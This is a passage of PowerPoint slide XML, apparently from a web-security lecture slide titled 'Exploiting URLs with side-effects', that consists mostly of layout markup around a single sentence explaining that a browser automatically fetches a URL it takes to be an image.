                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" b="1">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Browser automatically  visits the URL to obtain  what it believes will be  an image</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2294">
              <a:solidFill>
                <a:prstClr val="black"/>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8781617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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81923" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81924" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81925" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81928" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8547287" y="1638861"/>
            <a:ext cx="1818154" cy="830636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81929" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1764926" cy="822232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1825158" cy="801310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
